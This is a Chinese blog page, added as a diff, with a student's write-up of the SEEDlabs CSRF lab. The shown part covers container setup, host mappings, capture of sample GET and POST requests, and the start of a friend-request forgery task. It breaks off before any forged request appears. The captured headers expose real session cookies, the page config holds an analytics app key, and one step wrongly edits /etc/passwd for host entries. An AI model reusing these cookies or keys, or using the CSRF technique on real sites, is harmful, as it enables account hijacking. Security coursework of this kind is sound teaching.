@@ -1,0 +1,992 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="环境设置容器设置 起docker 123456789101112[11&#x2F;07&#x2F;25]seed@VM:~&#x2F;Desktop$ docker-compose up -d...[11&#x2F;07&#x2F;25]seed@VM:~&#x2F;Desktop$ docker psCONTAINER ID        IMAGE                      COMMAND                  CREATE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="软件安全实验 SEEDlabs 跨站请求伪造攻击实验">
+<meta property="og:url" content="http://example.com/2026/test38/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="环境设置容器设置 起docker 123456789101112[11&#x2F;07&#x2F;25]seed@VM:~&#x2F;Desktop$ docker-compose up -d...[11&#x2F;07&#x2F;25]seed@VM:~&#x2F;Desktop$ docker psCONTAINER ID        IMAGE                      COMMAND                  CREATE">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154240.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154990.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154518.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154576.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154190.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154111.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154987.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154266.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154450.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155052.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155663.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155638.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155161.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152155007.png">
+<meta property="article:published_time" content="2026-04-15T10:30:57.087Z">
+<meta property="article:modified_time" content="2026-04-15T13:55:35.722Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="SEEDlabs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154490.png">
+  
+  
+  
+  <title>软件安全实验 SEEDlabs 跨站请求伪造攻击实验 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="软件安全实验 SEEDlabs 跨站请求伪造攻击实验"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:30" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">软件安全实验 SEEDlabs 跨站请求伪造攻击实验</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><p><strong>容器设置</strong></p>
+<p>起docker</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">[<span class="hljs-number">11</span>/<span class="hljs-number">07</span>/<span class="hljs-number">25</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>docker-compose up -d<br>...<br>[<span class="hljs-number">11</span>/<span class="hljs-number">07</span>/<span class="hljs-number">25</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>docker ps<br><span class="hljs-variable constant_">CONTAINER</span> <span class="hljs-variable constant_">ID</span>        <span class="hljs-variable constant_">IMAGE</span>                      <span class="hljs-variable constant_">COMMAND</span>                  <span class="hljs-variable constant_">CREATED</span>             <span class="hljs-variable constant_">STATUS</span>              <span class="hljs-variable constant_">PORTS</span>                 <span class="hljs-variable constant_">NAMES</span><br>6c2ab66e4b48        seed-image-mysql-csrf      <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">5</span> minutes ago       <span class="hljs-title class_">Up</span> <span class="hljs-number">5</span> minutes        <span class="hljs-number">3306</span>/tcp, <span class="hljs-number">33060</span>/tcp   mysql-<span class="hljs-number">10.9</span>.<span class="hljs-number">0.6</span><br>54e77615f136        seed-image-www-csrf        <span class="hljs-string">&quot;/bin/sh -c &#x27;service…&quot;</span>   <span class="hljs-number">5</span> minutes ago       <span class="hljs-title class_">Up</span> <span class="hljs-number">5</span> minutes                              elgg-<span class="hljs-number">10.9</span>.<span class="hljs-number">0.5</span><br>97152b04c36e        seed-image-attacker-csrf   <span class="hljs-string">&quot;/bin/sh -c &#x27;service…&quot;</span>   <span class="hljs-number">5</span> minutes ago       <span class="hljs-title class_">Up</span> <span class="hljs-number">5</span> minutes                              attacker-<span class="hljs-number">10.9</span>.<span class="hljs-number">0.105</span><br>[<span class="hljs-number">11</span>/<span class="hljs-number">07</span>/<span class="hljs-number">25</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/Desktop</span><span class="hljs-variable">$ </span>docker exec -it 97152b04c36e /bin/bash<br>root<span class="hljs-variable">@97152b04c36e</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ls</span><br>bin   dev  home  lib32  libx32  mnt  <span class="hljs-built_in">proc</span>  run   srv  tmp  var<br>boot  etc  lib   lib64  media   opt  root  sbin  sys  usr<br>root<span class="hljs-variable">@97152b04c36e</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154490.png" srcset="/img/loading.gif" lazyload alt="image-20251107162530912"></p>
+<p><strong>配置网络</strong></p>
+<p>在本实验中，我们将使用三个网站。第一个网站是易受攻击的Elgg网站，可通过<a target="_blank" rel="noopener" href="http://www.seed/">www.seed</a> server.com 访问。第二个网站是攻击者用来对Elgg发动攻击的恶意站点，通过<a target="_blank" rel="noopener" href="http://www.attacker32.com访/">www.attacker32.com访</a> 问。第三个网站用于防御实验任务，其主机名为<a target="_blank" rel="noopener" href="http://www.example32.com./">www.example32.com。</a></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">sudo vim /etc/passwd<br><br><span class="hljs-number">10.9.0.5</span>        www.seed-server.com<br><span class="hljs-number">10.9.0.5</span>        www.example32.com<br><span class="hljs-number">10.9.0.105</span>      www.attacker32.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154240.png" srcset="/img/loading.gif" lazyload alt="image-20251107163545236"></p>
+<h2 id="Task1：观察HTTP请求"><a href="#Task1：观察HTTP请求" class="headerlink" title="Task1：观察HTTP请求"></a>Task1：观察HTTP请求</h2><p>在跨站请求伪造攻击中，我们需要伪造HTTP请求。因此，我们需要知道一个合法的HTTP请求是什 么样子的，以及它使用什么参数等。为此，我们可以使用一个名为”HTTP Header Live”的火狐浏览器插件。本任务的目标是熟悉这个工具。指导中给出了如何使用这个工具的说明(§5.1)。</p>
+<p>请使用这个工具在 Elgg 中捕获一个HTTPGET请求和一个HTTPPOST请求。请在你的报告中指出这些请求中所使用的参数。</p>
+<p>简单来说，就是用HTTP Header Live抓GET、POST包。</p>
+<p>旧版本的firefox里的HTTP Header Live不能用了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154909.png" srcset="/img/loading.gif" lazyload alt="default"></p>
+<p>这里下了一个新版本的Firefox，安装HTTP Header Live插件</p>
+<p>随便在百度搜索，抓到一个GET包</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154384.png" srcset="/img/loading.gif" lazyload alt="image-20251107171328333"></p>
+<p>请求头如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Host</span>: sp3.baidu.com<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">144</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">144</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: image/avif,image/webp,image/png,image/svg+xml,image/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br, zstd<br><span class="hljs-attribute">Referer</span>: https://www.baidu.com/<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: BAIDUID=AEE928FD2429397AD0CC7B68394019CE:FG=<span class="hljs-number">1</span>; BIDUPSID=AEE928FD2429397A7B2BED401E773BD8; PSTM=<span class="hljs-number">1762506163</span>; H_PS_PSSID=<span class="hljs-number">60273</span>_63142_65248_65361_65517_65619_65759_65779_65806_65858_65915_65928_65983_65962_65968_65988_65997_66055_66119_65866_66149_66225_66200_66235_66294_66339_66360_66324; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; H_WISE_SIDS=<span class="hljs-number">60273</span>_63142_65248_65361_65619_65759_65779_65806_65858_65915_65928_65962_65968_65988_65997_66055_66119_65866_66149_66225_66200_66235_66294_66339_66360_66324; ab_sr=<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>_NjA3NjVkMmUzMjE3ZDM2MGY1NTQwMjA5NjhjMWM3MzU4NWE0ZDVhODAzYTM2ZTNlZjM3MjcxNGQ5NzAyYmYzMzg0ZTdjOWZiOTMyN2YxM2Q1NTdlZjRlNDFmZjlmYTBlODNhYWQ2ZTBlNWM3ZjQ4NTc4Mzk3NTk0ZDM1NDRiYjcwNWU5NThjOTJhZTExMTU4M2NmY2I5ZjBhZTMwOTkxNQ==; delPer=<span class="hljs-number">0</span>; PSINO=<span class="hljs-number">1</span>; BA_HECTOR=<span class="hljs-number">8</span>g8l2g0k8h2104ak208005a50ka5301kgrdmc24<br><span class="hljs-attribute">Sec</span>-Fetch-Dest: image<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: no-cors<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-site<br><br></code></pre></td></tr></table></figure>
+
+<p>URL：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">https://sp3.baidu.com/-0U_dTmfKgQFm2e88IuM_a/ps_fp.htm?pid=ps<span class="hljs-variable">&amp;fp</span>=undefined<span class="hljs-variable">&amp;im</span>=undefined<span class="hljs-variable">&amp;wf</span>=undefined<span class="hljs-variable">&amp;br</span>=3<span class="hljs-variable">&amp;qid</span>=ce556fad00115dfa<span class="hljs-variable">&amp;bi</span>=AEE928FD2429397AD0CC7B68394019CE:FG=1<span class="hljs-variable">&amp;psid</span>=AEE928FD2429397A7B2BED401E773BD8<br></code></pre></td></tr></table></figure>
+
+<p>GET传递的参数就是</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">pid</span><span class="hljs-operator">=</span>ps<span class="hljs-variable">&amp;fp</span>=undefined<span class="hljs-variable">&amp;im</span>=undefined<span class="hljs-variable">&amp;wf</span>=undefined<span class="hljs-variable">&amp;br</span>=<span class="hljs-number">3</span><span class="hljs-variable">&amp;qid</span>=ce556fad00115dfa<span class="hljs-variable">&amp;bi</span>=AEE928FD2429397AD0CC7B68394019CE:FG=<span class="hljs-number">1</span><span class="hljs-variable">&amp;psid</span>=AEE928FD2429397A7B2BED401E773BD8<br></code></pre></td></tr></table></figure>
+
+<p>然后再某旅行网站搜索，抓到一个POST包</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154990.png" srcset="/img/loading.gif" lazyload alt="image-20251107171019158"></p>
+<p>请求头如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Host</span>: apmfront.<span class="hljs-number">17</span>u.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64; rv:<span class="hljs-number">144</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">144</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br, zstd<br><span class="hljs-attribute">Content</span>-Type: text/plain;charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">567</span><br><span class="hljs-attribute">Origin</span>: https://www.ly.com<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Referer</span>: https://www.ly.com/<br><span class="hljs-attribute">Sec</span>-Fetch-Dest: empty<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: no-cors<br><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<br><br></code></pre></td></tr></table></figure>
+
+<p>POST传递的参数为</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;res&quot;</span>:<span class="hljs-string">&quot;[&#123;<span class="hljs-char escape_">\&quot;</span>rt<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>script<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rd<span class="hljs-char escape_">\&quot;</span>:868,<span class="hljs-char escape_">\&quot;</span>ru<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>https://hm.baidu.com/hm.js<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rs<span class="hljs-char escape_">\&quot;</span>:0&#125;,&#123;<span class="hljs-char escape_">\&quot;</span>rt<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>img<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rd<span class="hljs-char escape_">\&quot;</span>:300,<span class="hljs-char escape_">\&quot;</span>ru<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>https://vstgif.17u.cn/__tctm.gif<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rs<span class="hljs-char escape_">\&quot;</span>:0&#125;,&#123;<span class="hljs-char escape_">\&quot;</span>rt<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>img<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rd<span class="hljs-char escape_">\&quot;</span>:41,<span class="hljs-char escape_">\&quot;</span>ru<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>https://hm.baidu.com/hm.gif<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>rs<span class="hljs-char escape_">\&quot;</span>:0&#125;]&quot;</span>,<span class="hljs-string">&quot;rid&quot;</span>:<span class="hljs-string">&quot;P0369a76TH2k50c6S45d1Wcc&quot;</span>,<span class="hljs-string">&quot;sr&quot;</span>:<span class="hljs-string">&quot;1848x1089&quot;</span>,<span class="hljs-string">&quot;rr&quot;</span>:<span class="hljs-string">&quot;https://www.baidu.com/&quot;</span>,<span class="hljs-string">&quot;ak&quot;</span>:<span class="hljs-string">&quot;41d89d7189bf5514488a3b013a5554fb&quot;</span>,<span class="hljs-string">&quot;pu&quot;</span>:<span class="hljs-string">&quot;https://www.ly.com/mergetrain/book1&quot;</span>,<span class="hljs-string">&quot;pt&quot;</span>:<span class="hljs-string">&quot;11月08日青岛到火车_11月08日青岛到火车时刻表_11月08日青岛到列车时刻表_同程网&quot;</span>,<span class="hljs-string">&quot;ptc&quot;</span>:<span class="hljs-string">&quot;https&quot;</span>,<span class="hljs-string">&quot;ve&quot;</span>:<span class="hljs-string">&quot;1.0.7&quot;</span>,<span class="hljs-string">&quot;st&quot;</span>:<span class="hljs-number">1762506451046</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Task2：使用GET请求的CSRF攻击"><a href="#Task2：使用GET请求的CSRF攻击" class="headerlink" title="Task2：使用GET请求的CSRF攻击"></a>Task2：使用GET请求的CSRF攻击</h2><p>在这个任务中，我们需要Elgg社交网络中的两个账户Alice和Samy。Samy想成为Alice的朋友，但 Alice 拒绝添加他为好友。Samy决定使用CSRF攻击来实现他的目标。他向Alice发送了一个URL（通过电子邮件或在发布在Elgg上）。Alice对这个网址很好奇，点击了这个网址，这就把她带到了Samy的网站<a target="_blank" rel="noopener" href="http://www.attacker32.com./">www.attacker32.com。</a></p>
+<p>假设你是Samy，描述你如何构建网页的内容，以便当Alice访问该网页时， Samy能够被添加到Alice的好友列表中（假设Alice有一个活跃的Elgg会话）。</p>
+<p>为了添加受害者为好友，我们需要确定合法的添加好友HTTP请求（GET请求）内容是怎样的。可以 使用”HTTP Header Live”工具进行调查。在这个任务中，不允许编写JavaScript代码来发起CSRF攻击。 你的工作是在Alice访问网页时就使攻击成功，甚至不需要Alice在网页上进行任何点击。（提示：你可以 使用 img标签，这将自动触发一个HTTPGET请求）。</p>
+<p>Elgg 已经实施了一项措施来防御CSRF攻击。在添加朋友的HTTP请求中，你可能注意到每个请求包 括两个看起来很奇怪的参数：<code>__elgg_ts和__elgg_token</code>，这些参数正是被防御措施所使用的。如果它 们没有被设定为正确的值，那么请求将不会被Elgg接受。我们已经禁用了本实验中的防御措施，所以你不需要在伪造的请求中包括这两个参数。</p>
+<p>简单来说，就是我们（Samy）通过利用CSRF漏洞，让Alice不知不觉添加我们为好友。</p>
+<p>首先登录我们（Samy）的账号：<code>samy:seedsamy</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154518.png" srcset="/img/loading.gif" lazyload alt="image-20251107173325487"></p>
+<p>然后看一下添加好友是怎么实现的：</p>
+<p>点进 Alice 主页，发现Add friend功能。那我们点击Add friend，同时别忘了用HTTP Header Live抓包</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152154576.png" srcset="/img/loading.gif" lazyload alt="image-20251107173724781"></p>
+<p>抓到包之后，我们看一下</p>
